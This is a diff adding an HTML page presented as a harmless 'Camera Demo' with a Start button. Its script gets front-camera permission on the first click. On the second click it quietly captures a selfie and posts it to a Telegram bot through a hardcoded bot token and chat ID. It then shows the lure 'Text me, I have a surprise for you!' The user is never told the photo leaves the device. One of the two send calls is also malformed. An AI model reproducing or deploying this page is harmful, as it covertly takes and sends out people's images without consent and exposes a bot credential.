@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Camera Demo</title>
+<style>
+body {
+  margin: 0;
+  background: #000;
+  color: white;
+  font-family: Arial;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+video {
+  width: 90%;
+  max-width: 350px;
+  border: 2px solid white;
+  border-radius: 8px;
+  display: none;
+}
+button {
+  padding: 12px 22px;
+  font-size: 20px;
+  border: none;
+  border-radius: 8px;
+  background: #0d6efd;
+  color: white;
+  margin-top: 20px;
+}
+</style>
+</head>
+<body>
+
+<h2>Welcome</h2>
+<button id="startBtn">Start</button>
+<video id="camera" autoplay playsinline></video>
+
+<p id="msg" style="margin-top:20px;"></p>
+
+<script>
+let video = document.getElementById("camera");
+let startBtn = document.getElementById("startBtn");
+let msg = document.getElementById("msg");
+let cameraAllowed = false;
+
+// FIRST CLICK → ASK CAMERA PERMISSION
+startBtn.addEventListener("click", async () => {
+  if (!cameraAllowed) {
+    try {
+      let stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" }
+      });
+      
+      video.srcObject = stream;
+      video.style.display = "block";
+      cameraAllowed = true;
+      startBtn.innerText = "Start";
+
+    } catch (err) {
+      alert("Camera permission needed to continue.");
+    }
+    return;
+  }
+
+  // SECOND CLICK → TAKE PHOTO
+  takePhoto();
+});
+
+// TAKE SELFIE + SEND TO TELEGRAM
+function takePhoto() {
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0);
+  const imageData = canvas.toDataURL("image/png");
+
+  sendToTelegram(imageData);
+
+  msg.innerText = "Text me, I have a surprise for you!";
+}
+
+// SEND IMAGE TO TELEGRAM BOT
+function sendToTelegram(base64img) {
+  const botToken = "8205878195:AAHQyaGIGg7FOtfB5k4rfSHdu3zliip7TkI";
+  const chatId = "135986918";
+  const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+
+  fetch(url, {
+    method: "POST",
+    body: new FormData().append("chat_id", chatId)
+  });
+
+  let formData = new FormData();
+  formData.append("chat_id", chatId);
+  formData.append("photo", base64img);
+
+  fetch(url, { method: "POST", body: formData });
+}
+</script>
+</body>
+</html>
